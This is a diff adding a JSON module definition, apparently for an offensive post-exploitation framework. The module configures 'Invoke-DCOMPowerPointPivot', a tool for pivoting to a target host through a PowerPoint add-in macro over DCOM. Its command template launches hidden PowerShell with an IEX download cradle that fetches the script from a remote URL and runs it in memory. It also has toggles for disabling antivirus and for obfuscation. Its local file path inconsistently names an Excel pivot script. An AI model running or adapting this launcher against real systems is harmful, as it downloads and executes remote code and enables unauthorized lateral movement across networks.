@@ -1,0 +1,39 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-DCOMPowerPointPivot",
+    "author": ["(@_nephalem_)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-DCOMPowerPointPivot"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": true,
+    "notes": "",
+    "remote": "https://raw.githubusercontent.com/attactics/Invoke-DCOMPowerPointPivot/master/Invoke-DCOMPowerPointPivot.ps1",
+    "local": ["data", "src", "attactics", "gists", "Invoke-DCOMPowerPointPivot", "Invoke-ExcelMacroPivot.ps1"],
+    "options": [
+      {"name": "Target", "value": "'127.0.0.1'", "required": true, "flag": "-Target", "description":"Target host"},
+      {"name": "AddinPath", "value": "'c:\\PowerPoint.ppa'", "required": true, "flag": "-AddinPath", "description":"Local filepath for .ppa / .ppam file"},
+      {"name": "DestPath", "value": "'c:\\Windows\\Temp\\NiceFile.ppam'", "required": false, "flag": "-DestPath", "description":"Specifies a custom destination file path on the target device. Default: Place file with same name as source file in C:\\"},
+      {"name": "ExecWaitTime", "value": "10", "required": false, "flag": "-ExecWaitTime", "description":"Specifies a custom wait time for the Add-In to execute before unloading. Default: 5 seconds"}
+    ],
+    "description": "Facilitates pivoting to a target through PowerPoint Add-In Macro and the PowerPoint COM object cmdlet adapted from Invoke-ExcelMacroPivot by @enimga0x3",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/attactics/Invoke-DCOMPowerPointPivot/master/Invoke-DCOMPowerPointPivot.ps1');",
+      "Invoke-DCOMPowerPointPivot",
+      "{{Target}}",
+      "{{AddinPath}}",
+      "{{DestPath}}",
+      "{{ExecWaitTime}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": false,
+    "obfuscate": false,
+    "base64": false
+  }
+}
